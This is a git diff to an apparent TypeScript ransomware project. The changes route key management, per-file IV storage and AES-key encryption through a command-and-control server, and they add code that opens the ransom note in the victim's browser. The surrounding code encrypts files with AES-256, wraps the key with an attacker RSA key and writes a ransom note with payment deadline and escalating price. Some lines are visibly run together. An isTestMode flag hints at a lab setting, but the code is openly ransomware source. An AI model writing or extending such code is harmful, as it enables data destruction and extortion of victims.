@@ -13,6 +13,7 @@ import { scanDirectory, getTestTargetFiles } from './fileScanner'
 import { createRansomNote } from './ransomNote'
 import { RansomwareLogger, LogLevel } from './logger'
 import { loadConfig } from './config'
+import { openRansomNote } from './openRansomNote'
 
 // Load configuration
 const config = loadConfig()
@@ -49,11 +50,9 @@ export async function encryptTargetFiles(
         encryptionTime: 0,
         targetExtensions: [] as string[],
         timestamp: new Date()
-    };
-
-    // Initialize key management
+    };    // Initialize key management (now connects to C2 server)
     const { victimId, aesKey, attackerPublicKey, attackerPrivateKey } =
-        initializeKeyManagement()
+        await initializeKeyManagement()
     logger.info(`Victim ID generated: ${victimId}`)
     logger.encryption(`AES-256 key generated for file encryption`)
     logger.encryption(`RSA-2048 key pair generated for key encryption`)
@@ -117,10 +116,8 @@ export async function encryptTargetFiles(
                 fileSize: fileStats.size,
                 elapsedTime: fileEncryptTime,
                 success: true
-            });
-
-            // Store the IV for this file
-            storeFileIV(victimId, filePath, iv)
+            });            // Store the IV for this file (now connects to C2 server)
+            await storeFileIV(victimId, filePath, iv)
             logger.encryption(`IV stored for file: ${filePath}`)
 
             // Add to the list of encrypted files
@@ -140,10 +137,8 @@ export async function encryptTargetFiles(
         } catch (err) {
             logger.error(`Error encrypting ${filePath}: ${err}`)
         }
-    }
-
-    // Encrypt the AES key with the attacker's public key
-    const encryptedAESKey = encryptAESKey(aesKey, attackerPublicKey)
+    }    // Encrypt the AES key with the attacker's public key (now connects to C2 server)
+    const encryptedAESKey = await encryptAESKey(aesKey, attackerPublicKey)
     logger.encryption(`AES key encrypted with RSA-2048 public key`)
     logger.logCryptoOperation('encrypt', 'RSA-2048-OAEP', 2048, {
         success: true,
@@ -164,14 +159,19 @@ export async function encryptTargetFiles(
             currency: config.ransomCurrency,
             deadlineHours: config.ransomDeadlineHours,
             priceIncrease: config.ransomPriceIncrease
-        }
-    )
+        }    )    
     logger.info(`Created ransom note`)
 
     // Change wallpaper if configured
     if (config.changeWallpaper && !isTestMode) {
         logger.info(`Changing desktop wallpaper (enabled in configuration)`)
         // Implementation would go here
+    }    // Open the ransom note in the browser
+    try {
+        await openRansomNote(targetDirectory);
+        logger.info("Opened ransom note in default browser");
+    } catch (error) {
+        logger.error(`Failed to open ransom note: ${error}`);
     }
     
     // Calculate total encryption time and generate summary
@@ -214,10 +214,8 @@ export async function decryptFiles(
         metadataPath,
         targetDirectory
     )
-    logger.info(`Found metadata for victim ID: ${victimId}`)
-
-    // Decrypt the AES key
-    const aesKey = decryptAESKey(encryptedAESKey, attackerPrivateKey)
+    logger.info(`Found metadata for victim ID: ${victimId}`)    // Decrypt the AES key
+    const aesKey = await decryptAESKey(encryptedAESKey, attackerPrivateKey)
     logger.decryption(`Successfully decrypted the AES key with RSA private key`)
     logger.logCryptoOperation('decrypt', 'RSA-2048-OAEP', 2048, {
         success: true
